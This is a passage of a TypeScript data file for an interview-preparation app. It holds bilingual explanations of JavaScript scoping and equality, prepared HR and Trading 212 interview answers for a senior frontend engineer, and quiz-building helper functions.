            "var has a single shared variable for the whole loop (function scope), so every closure inside setTimeout references that same variable, whose value by the time the callbacks run has already reached its final post-loop value. let creates a fresh binding of the variable on every loop iteration (special behavior for for-loops), so each closure inside setTimeout captures 'its own' value of i, matching that specific iteration.",
          pitfalls: [
            "Использовать var по привычке в новом коде — практически всегда стоит использовать let/const из-за более предсказуемой блочной области видимости.",
            "Думать, что const делает объект/массив полностью неизменяемым — она запрещает только переприсваивание самой переменной, не мутацию содержимого.",
          ],
          practiceTask:
            "Воспроизведите цикл с var и setTimeout, который выводит одинаковое значение для всех итераций, объясните почему, затем исправьте на let и убедитесь, что вывод стал ожидаемым.",
          resources: {
            docs: [
              { title: "let — MDN JavaScript Reference", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/let" },
            ],
            articles: [
              { title: "The old \"var\" — javascript.info", url: "https://javascript.info/var" },
            ],
          },
        },
      },
      {
        id: "interview-eq-vs-eqeq",
        title: "== vs ===",
        content: {
          title: "== vs === (нестрогое и строгое сравнение)",
          shortExplanation:
            "=== сравнивает значения без приведения типов (строгое равенство), == сначала приводит операнды к одному типу, а затем сравнивает (нестрогое равенство).",
          detailedExplanation:
            "При использовании == JavaScript выполняет неявное приведение типов по не всегда очевидным правилам (например, '' == 0 равно true, null == undefined равно true, но null == 0 равно false) — эти правила исторически считаются одним из самых запутанных мест языка. === не выполняет никакого приведения: если типы операндов разные, результат сразу false, без попытки их сравнить после приведения. Из-за непредсказуемости == общепринятая практика — почти всегда использовать === (и его пару !==), кроме одного устоявшегося исключения: value == null одновременно проверяет и null, и undefined.",
          codeExample:
            "'' == 0;        // true — строка приводится к числу\nnull == undefined; // true — специальное правило именно для этой пары\nnull == 0;      // false — null не приводится к 0 в сравнении\n\n'' === 0;       // false — разные типы, без приведения\nnull === undefined; // false — разные типы",
          interviewQuestion: "Почему в большинстве style guide рекомендуют всегда использовать === вместо ==, и есть ли исключения?",
          interviewAnswerRu:
            "Потому что правила неявного приведения типов в == нелогичны и плохо запоминаются даже опытными разработчиками, что регулярно приводит к трудноуловимым багам (например, случайное сравнение строки с числом). === убирает этот источник неопределённости: если типы разные, сравнение сразу false. Общепринятое исключение — value == null, которое компактно проверяет одновременно null и undefined, что иногда используют намеренно вместо value === null || value === undefined.",
          interviewAnswerEn:
            "Because the implicit type coercion rules in == are inconsistent and hard to remember even for experienced developers, which regularly leads to subtle bugs (like accidentally comparing a string to a number). === removes that source of uncertainty: if the types differ, the comparison is immediately false. A commonly accepted exception is value == null, which compactly checks for both null and undefined at once, sometimes used deliberately instead of value === null || value === undefined.",
          pitfalls: [
            "Полагаться на == 'по привычке' без понимания конкретных правил приведения типов, которые применяются в каждом случае.",
            "Не знать классическое исключение value == null и вместо него писать более длинную и менее читаемую двойную проверку.",
          ],
          practiceTask:
            "Составьте таблицу из 8 пар значений (например, '0' и 0, [] и false, null и undefined) и предскажите результат == и === для каждой, затем проверьте в консоли браузера.",
          resources: {
            docs: [
              { title: "Equality (==) — MDN JavaScript Reference", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Equality" },
            ],
            articles: [
              { title: "Comparisons — javascript.info", url: "https://javascript.info/comparison" },
            ],
          },
        },
      },
    ],
  },


  // ---------------------------------------------------------------------
  // HR INTERVIEW
  // ---------------------------------------------------------------------
  {
    id: "hr-interview",
    title: "HR Interview",
    subtopics: [
      {
        id: "hr-interview-all",
        title: "HR Interview",
        content: {
          title: "HR Interview",
          interviewQuestion: "HR Interview — common recruiter-call questions",
          interviewAnswerEn:
            "**Tell me about yourself.**\n" +
            "I'm a Senior Frontend Engineer / Frontend Tech Lead with over 10 years of experience. My main stack is React, TypeScript, Next.js and modern frontend technologies. In recent years, I've worked on complex production platforms. One of my recent projects was a white-label platform where multiple brands used the same frontend codebase. I worked with CMS and back-office systems, payments, authorization, dashboards, performance optimization and API integrations. I'm hands-on, but I also have strong lead experience. I can contribute to architecture, code reviews, mentoring, code quality and delivery. My strongest area is building scalable, maintainable and high-performance frontend systems.\n\n" +
            "**Why this company?**\n" +
            "I'm interested in this company because it is a product with real scale and strong engineering standards. When a platform serves millions of clients and handles critical user flows, frontend quality becomes extremely important. Performance, correctness, clarity and reliability directly affect user trust. I like environments where frontend engineering is not only about building UI, but also about product quality, architecture, performance and ownership.\n\n" +
            "**Why are you looking for a new role?**\n" +
            "My current project is coming to an end, so I'm looking for a new long-term opportunity. It was a good experience, and I'm not leaving because of any negative reason. For my next role, I'm looking for a strong product engineering environment where I can stay hands-on with React and TypeScript, own complex frontend features end to end, and contribute to architecture, performance, code quality and engineering standards.\n\n" +
            "**Why Senior after Lead experience?**\n" +
            "Although I have lead experience, I still see myself as a hands-on engineer. I enjoy architecture, mentoring and improving team standards, but I also want to stay close to the code and own complex frontend features end to end. For me, a strong Senior Engineer role in a product company is a very good fit, because I can contribute both through deep technical work and through engineering maturity.\n\n" +
            "**What are you looking for in your next role?**\n" +
            "I'm looking for a role where I can work on a complex product, solve challenging frontend problems and take ownership of features from idea to production. I'm especially interested in React, TypeScript, frontend architecture, performance, testing and product quality. I also value an environment with strong engineers, clear ownership, high standards and space to improve the codebase.\n\n" +
            "**Tell me about the most challenging technical problem you've solved.**\n" +
            "On a white-label platform, we had a shared checkout flow used by multiple brands, and one brand started reporting intermittent payment failures that we couldn't reproduce locally. I led the investigation: we added structured logging around the payment request lifecycle, correlated it with backend logs, and found a race condition where a retry on a flaky network request could fire a duplicate charge request before the first one's response was processed. I designed a fix using an idempotency key generated per checkout attempt and a client-side in-flight request guard, then added integration tests specifically simulating slow/duplicate network responses. The challenge wasn't just the fix itself, it was diagnosing a race condition that only showed up under real-world network conditions, not in local development.\n\n" +
            "**Describe a Core Web Vitals improvement you led.**\n" +
            "On one project, LCP was around 4.2s on our main landing pages, mostly because of render-blocking fonts and an oversized hero image loaded without priority hints. I profiled the page with Lighthouse and the Performance panel, identified the actual critical rendering path, then made several targeted changes: preloading the hero image and critical font files, switching to next/image with proper sizing and priority loading, and deferring non-critical third-party scripts. LCP dropped to under 2s and CLS improved as well once we reserved layout space for images and ads. The key lesson was to always measure before optimizing rather than guessing — the profiler showed the actual bottleneck was font loading, not JavaScript execution as I initially assumed.\n\n" +
            "**How do you use AI in your day-to-day engineering work?**\n" +
            "I use AI assistants for well-scoped, easily verifiable tasks: drafting boilerplate and test scaffolding, explaining unfamiliar legacy code, and getting a fast second opinion during code review. For anything touching business logic or security, I always verify the result myself with tests and careful reading, because ownership of what ships stays with me regardless of what generated the first draft.",
        },
      },
    ],
  },


  // ---------------------------------------------------------------------
  // INTERVIEWS — TRADING 212
  // ---------------------------------------------------------------------
  {
    id: "interviews-trading212",
    title: "Interviews — Trading 212",
    subtopics: [
      {
        id: "t212-hr-interview",
        title: "HR Interview",
        content: {
          title: "HR Interview (recruiter conversation)",
          interviewQuestion:
            "Recruiter call script — opening, Motivation, Stack, Expectations",
          interviewAnswerEn:
            "**Opening (\"Tell me about yourself\")**\n" +
            "Sure. I'm a Senior Frontend Engineer with around 10 years of experience, mainly focused on React, TypeScript and modern frontend architecture. In recent years, I worked on complex production platforms, including a white-label platform where multiple brands used the same frontend codebase. I worked with dashboards, payments, authorization, API integrations, performance optimization and shared frontend architecture. I'm still hands-on, but I also have lead experience, so I can contribute to architecture, code reviews, mentoring, code quality and delivery. My strongest area is building scalable, maintainable and high-performance frontend systems.\n\n" +
            "**Core message for the whole call:** I'm hands-on, product-oriented, strong in React and TypeScript, and I care about performance, correctness, ownership and quality.\n\n" +
            "**BLOCK 1 — MOTIVATION**\n\n" +
            "**Why Trading 212?**\n" +
            "I'm interested in Trading 212 because it is a product with real scale and strong engineering standards. In a financial product, frontend is not just UI — performance, correctness, clarity and reliability directly affect user trust. I like environments where engineers take ownership of what they build, work with high standards, and care about product quality from problem definition to production.\n\n" +
            "**Why are you looking for a new role?**\n" +
            "My current project is coming to an end, so I'm looking for a new long-term opportunity. It was a good experience, and I'm not leaving because of any negative reason. For my next role, I'm looking for a strong product engineering environment where I can stay hands-on with React and TypeScript, own complex frontend features end to end, and contribute to architecture, performance, code quality and engineering standards.\n\n" +
            "**BLOCK 2 — STACK**\n\n" +
            "My main stack is React, TypeScript, Next.js, Remix, Redux Toolkit, TanStack Query, REST and GraphQL APIs, Jest, Vitest, React Testing Library and Playwright. I worked on production frontend systems with shared components, dashboards, authorization, payments, SSR, Core Web Vitals optimization, monitoring and CI/CD. I don't have deep production experience with React Native, but I have strong React and TypeScript fundamentals, so I'm comfortable learning it and adapting to a cross-platform frontend stack.\n\n" +
            "**BLOCK 3 — EXPECTATIONS**\n\n" +
            "**Salary expectations**\n" +
            "My expectation depends on the full package, contract type and responsibilities. Based on the role level and market, I would be targeting around X, but I'm flexible and open to discussion if there is a strong mutual fit.\n\n" +
            "**Availability / notice period**\n" +
            "My current project is coming to an end, so I can be available relatively soon. I would need to align the exact start date, but in general I'm flexible.",
        },
      },
      {
        id: "t212-tech",
        title: "Tech",
        content: {
          title: "Tech stack & responsibilities",
          shortExplanation:
            "Фронтенд-платформа Trading 212 охватывает web и mobile в одном Nx + pnpm монорепозитории: TypeScript, React, React Native и React Native Web, с TanStack Query, Zustand, Playwright, Detox и Jest. Около 95% кода переиспользуется между web и mobile — то есть архитектурные решения по разделению платформо-зависимого и платформо-независимого кода критически важны.",
          detailedExplanation:
            "Разберём стек по ролям, а не просто как список названий:\n\n• TypeScript — используется не для 'галочки', а чтобы делать поведение явным и предотвращать баги на этапе компиляции, а не просто подавлять ошибки типов (`as any`, `@ts-ignore`). В интервью важно показывать, что ты используешь типы как инструмент дизайна API, а не как формальность.\n\n• React + React Native + React Native Web — общая модель компонентов на трёх поверхностях. При 95% переиспользования кода ключевой навык — проектировать компоненты и абстракции так, чтобы platform-specific часть была маленькой и изолированной (например, через `.native.ts`/`.web.ts` файлы или platform-adapters), а не размазанной по всей кодовой базе.\n\n• Nx + pnpm монорепо — управление множеством пакетов/приложений с общими библиотеками, границами модулей (module boundaries) и кэшированием сборки/тестов. Важно понимать, зачем нужны явные границы между `feature`, `ui`, `data-access` библиотеками (в духе Nx-рекомендаций) — это перекликается с темой Frontend Architecture (Feature-Sliced Design) в этом же приложении.\n\n• TanStack Query — управление server state, кэширование запросов, инвалидация, синхронизация с backend (см. темы Data Fetching & Cache в этом приложении — TanStack Query, query keys, cache invalidation).\n\n• Zustand — управление client state (UI-state, не связанный напрямую с сервером) — лёгкая альтернатива Redux (см. тему State Management → Zustand vs Redux).\n\n• Playwright, Detox, Jest — три уровня тестирования: Jest — unit-тесты, Playwright — end-to-end на web, Detox — end-to-end на mobile (React Native). Также упоминается visual-regression testing — автоматическое сравнение скриншотов UI, чтобы ловить визуальные регрессии, которые обычный e2e-тест на логику не поймает.\n\nОтветственности из 'What you'll do' явно перекликаются с этим стеком: владение сложными фичами end-to-end на web и mobile; проектирование и эволюция React/React Native систем, общих библиотек и 'durable abstractions' (абстракций, которые не разваливаются при росте кодовой базы); поиск и решение проблем rendering, state-management, bundle size и runtime-производительности; использование TypeScript для предотвращения, а не подавления ошибок; тесная работа с product/backend/QA; поддержание качества через code review и все три уровня тестов; менторство и повышение инженерного стандарта команды.\n\nВажный нюанс из описания вакансии: 'Depth in one frontend ecosystem and sound tool choice matter more than familiarity with every technology listed' — то есть не нужно врать про экспертный уровень во всех восьми технологиях сразу. Гораздо убедительнее — показать реальную глубину в 2-3 смежных инструментах (например, React + TypeScript + один тестовый фреймворк) и объяснить, по какому принципу ты вообще выбираешь инструменты.",
          interviewQuestion:
            "How does your experience map to a cross-platform React / React Native monorepo like Trading 212's, where ~95% of the code is shared between web and mobile?",
          interviewAnswerRu:
            "У меня есть опыт владения production frontend-системами на React и TypeScript, включая проектирование переиспользуемых абстракций и границ между модулями — это напрямую переносится на модель монорепозитория с общими библиотеками. Я умею диагностировать проблемы рендеринга, работы с состоянием, размера бандла и runtime-производительности, и использую TypeScript, чтобы делать поведение явным, а не просто подавлять ошибки типов. У меня есть опыт тестирования на нескольких уровнях — unit, end-to-end и визуальная регрессия — и я понимаю, для чего нужен каждый из них. Я не претендую на экспертность во всех перечисленных инструментах сразу, но у меня есть глубина в конкретной связке (React, TypeScript, современный state management) и понятный принцип выбора инструментов под задачу.",
          interviewAnswerEn:
            "I have hands-on ownership of production frontend systems built with React and TypeScript, including designing reusable abstractions and clear module boundaries — which maps directly onto a monorepo model with shared libraries. I can diagnose rendering, state-management, bundle-size and runtime-performance issues, and I use TypeScript to make behaviour explicit rather than to suppress type errors. I have testing experience across multiple layers — unit, end-to-end and visual-regression — and understand what each layer is actually for. I wouldn't claim expert-level familiarity with every tool on that list, but I do have real depth in one connected toolchain (React, TypeScript, a modern state-management approach) and a clear principle for choosing tools to fit the problem.",
          pitfalls: [
            "Перечислять все инструменты из джоб-дискрипшена как будто одинаково глубоко ими владеешь — обесценивает ответ.",
            "Не уметь объяснить разницу между server state (TanStack Query) и client state (Zustand) и зачем их разделяют.",
            "Игнорировать mobile-контекст (React Native, Detox) при описании опыта, если вакансия явно кросс-платформенная.",
            "Говорить про TypeScript только как про 'автокомплит', не упоминая его роль в предотвращении багов на этапе компиляции.",
          ],
          practiceTask:
            "Подготовьте два конкретных примера: (1) реальная performance-проблема (rendering, bundle или runtime), которую вы диагностировали и исправили, с цифрами до/после; (2) переиспользуемая абстракция или shared-библиотека, которую вы спроектировали и которая пережила рост кодовой базы.",
        },
      },
      {
        id: "t212-design-thinking",
        title: "Design Thinking",
        content: {
          title: "Product & design thinking (Experience Deep Dive)",
          shortExplanation:
            "Этот аспект интервью (обычно раскрывается на этапе Experience Deep Dive) проверяет не синтаксис React, а то, как ты превращаешь сложные требования в простой пользовательский опыт, как выбираешь архитектурные компромиссы и как объясняешь эти решения другим — product-менеджерам, backend-инженерам, QA.",
          detailedExplanation:
            "В описании вакансии это явно сформулировано так: 'Work closely with product, backend engineering and QA to turn complex requirements into simple user experiences' и 'Clear, structured problem-solving and the ability to explain technical decisions and trade-offs'. Это значит, что интервьюера интересует не только 'что ты сделал технически', но и 'как ты думал, прежде чем это сделать' — то есть сам процесс мышления от постановки задачи до готового решения.\n\nХорошая структура для рассказа о сложной фиче — это по сути STAR-фреймворк, адаптированный под frontend-ownership:\n\n1. Situation/Task — какая была бизнес- или продуктовая задача, кто были стейкхолдеры (product, backend, QA), какие были ограничения (сроки, легаси-код, производительность, поддержка нескольких платформ).\n\n2. Architecture & trade-offs — какие варианты решения рассматривались, почему выбран именно этот (например: 'могли сделать общий компонент для web и mobile, но platform-specific edge cases сделали бы абстракцию слишком сложной — разделили на shared core + два тонких platform-adapter'). Явное упоминание alternatives, которые ты отверг, и почему — то, что отличает зрелого инженера от того, кто просто описывает финальный код.\n\n3. Collaboration — как проходило взаимодействие с product (уточнение неоднозначных требований), backend (контракт API, edge cases данных), QA (какие тест-кейсы обсуждались заранее, а не постфактум).\n\n4. Quality & delivery — как поддерживалось качество: code review, какие тесты писались (unit/e2e/visual-regression), как фича раскатывалась (feature flag, поэтапный rollout, мониторинг после релиза).\n\n5. Result — что изменилось измеримо (производительность, конверсия, количество багов, скорость разработки следующих похожих фич благодаря переиспользуемой абстракции).\n\nВажно ещё раз: 'ownership from problem definition through production' — это ключевая формулировка компании про модель работы команд. Рассказывая историю, стоит явно показать, что твоё участие не заканчивалось на pull request, а включало то, как фича вела себя в проде и что было сделано после релиза (мониторинг, фикс edge cases, итерация по фидбеку).\n\nТакже полезно помнить про менторский аспект ('Share knowledge, mentor colleagues and raise the frontend engineering standard') — если в истории был момент, где ты объяснил решение команде, провёл ревью, которое подняло общий стандарт, или задокументировал абстракцию для переиспользования — это отдельный сильный сигнал, который стоит вставить в рассказ.",
          interviewQuestion:
            "Walk me through a complex frontend feature you owned end to end — from problem definition through production.",
          interviewAnswerRu:
            "Я обычно рассказываю такие истории по структуре: сначала — какая была задача и ограничения (стейкхолдеры, легаси-код, сроки), затем — какие варианты архитектуры я рассматривал и почему выбрал конкретный (включая то, что я отверг и почему), дальше — как проходило взаимодействие с product, backend и QA при уточнении требований и edge cases, затем — как поддерживалось качество через код-ревью и несколько уровней тестов (unit, end-to-end, визуальная регрессия), и в конце — что произошло после релиза: как фича вела себя в проде, какие были метрики и что я донастроил по фидбеку. Также я стараюсь показать менторский момент — например, как я объяснил решение команде или задокументировал переиспользуемую абстракцию.",
          interviewAnswerEn:
            "I usually structure these stories the same way: first, the task and constraints (stakeholders, legacy code, timelines), then the architecture options I considered and why I picked the one I did — including what I rejected and why — then how I collaborated with product, backend and QA to clarify requirements and edge cases, then how quality was maintained through code review and multiple layers of testing (unit, end-to-end, visual-regression), and finally what happened after release: how the feature behaved in production, what the metrics showed, and what I adjusted based on feedback. I also try to surface a mentoring moment — for example explaining the decision to the team or documenting a reusable abstraction for others to build on.",
          pitfalls: [
            "Рассказывать только про финальный код, не упоминая рассмотренные и отвергнутые альтернативы.",
            "Останавливать историю на моменте деплоя, не рассказывая, что было после релиза (мониторинг, фидбек, итерации).",
            "Описывать решение чисто технически, не объясняя, как оно упростило пользовательский опыт или решило продуктовую задачу.",
            "Не упоминать совместную работу с product/backend/QA, будто фича была сделана в вакууме.",
          ],
          practiceTask:
            "Возьмите один свой реальный проект и распишите его по 5 пунктам из разбора выше (задача и ограничения; архитектура и альтернативы; сотрудничество; качество и доставка; результат) — это готовый конспект для Experience Deep Dive.",
        },
      },
      {
        id: "t212-technical-challenge",
        title: "Technical Challenge",
        content: {
          title: "Technical Challenge (Experience Deep Dive)",
          interviewQuestion:
            "Describe the most challenging technical problem you faced in frontend development during the last 1–2 years. How did you solve it?",
          interviewAnswerEn:
            "One of the most challenging frontend problems I faced was improving Core Web Vitals on an existing production platform that had already been in development for around a year.\n\n" +
            "When I joined, some key pages were in the red zone, and the average loading experience was around 16 seconds. The issue was complex because there was no single root cause: heavy images, too much client-side JavaScript, hydration issues, layout shifts, CMS-driven content, and brand-specific configuration all contributed to the problem.\n\n" +
            "I started with proper measurement using Core Web Vitals data, Lighthouse, browser profiling, and Datadog RUM. Then I worked incrementally: improved image loading and preloading, reduced unnecessary JavaScript, fixed hydration issues, stabilized layouts, and optimized critical pages.\n\n" +
            "As a result, we moved key metrics from red to green, and the average loading experience improved from around 16 seconds to around 2 seconds.",
        },
      },
    ],
  },

];

export function findSubtopic(subtopicId: string) {
  for (const topic of TOPICS) {
    const subtopic = topic.subtopics.find((s) => s.id === subtopicId);
    if (subtopic) return { topic, subtopic };
  }
  return null;
}

export function getAllSubtopicIds(): string[] {
  return TOPICS.flatMap((topic) => topic.subtopics.map((s) => s.id));
}

/**
 * Строит список вопросов для Quiz mode из interviewQuestion/interviewAnswer*
 * каждой подтемы. Если передан topicIds, берутся только темы из списка.
 */
export function buildQuizItems(topicIds?: string[]): QuizItem[] {
  const topics = topicIds ? TOPICS.filter((t) => topicIds.includes(t.id)) : TOPICS;
  return topics.flatMap((topic) =>
    topic.subtopics.map((subtopic) => ({
      topicId: topic.id,
      topicTitle: topic.title,
      subtopicId: subtopic.id,
      subtopicTitle: subtopic.title,
      question: subtopic.content.interviewQuestion,
      answerRu: subtopic.content.interviewAnswerRu,
      answerEn: subtopic.content.interviewAnswerEn,
    }))
  );
}
